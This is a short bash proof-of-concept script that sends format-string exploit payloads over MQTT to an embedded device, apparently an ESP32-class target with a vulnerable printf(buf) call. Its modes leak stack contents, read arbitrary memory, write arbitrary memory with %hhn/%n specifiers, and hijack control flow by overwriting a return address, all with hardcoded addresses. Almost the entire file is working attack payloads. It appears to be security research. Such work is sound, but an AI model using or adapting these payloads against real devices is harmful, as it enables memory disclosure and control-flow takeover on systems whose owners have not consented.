# The format string attack exists in the printf() function.
# The call is: printf(buf)
# buf is loaded into register A10.
# Registers A11 - A15 (and the stack) are used for incoming arguments.

command_prefix="mosquitto_pub -h localhost -p 1883 -t /topic/qos0 -m"

tag_addr="e82f403f"
write_addr="5098fc3f5198fc3f5298fc3f5398fc3f"
ret_addr="507efc3f517efc3f527efc3f"

nl_bin=$(echo "0a0d" | xxd -p -r)

tag_addr_bin=$(echo $tag_addr | xxd -p -r)
write_addr_bin=$(echo $write_addr | xxd -p -r)
ret_addr_bin=$(echo $ret_addr | xxd -p -r)

if [[ $1 == "readstack" ]]; then
    # Reading the stack
    $command_prefix "READING THE STACK:"
    $command_prefix "$nl_bin \
        Registers A11 - A15: %x %x %x %x %x $nl_bin \
        Stack frame: %x %x %x %x %x"
elif [[ $1 == "readmem" ]]; then
    # Reading arbitrary memory
    $command_prefix "READING ARIBTRARY MEMORY:"
    $command_prefix "$tag_addr_bin %6\$s"
elif [[ $1 = "writemem" ]]; then
    # Writing arbitrary memory
    $command_prefix "WRITING ARBITRARY MEMORY:"
    $command_prefix "$write_addr_bin%49x%6\$hhn %7\$hhn %8\$hhn %9\$n $nl_bin %6\$s"
elif [[ $1 == "hijack" ]]; then
    # Control flow hijack to address 0x4008e37c = abort()
    $command_prefix "CONTROL FLOW HIJACK"
    $command_prefix "$ret_addr_bin%112x%6\$hhn%103x%7\$hhn%37x%8\$hhn"
fi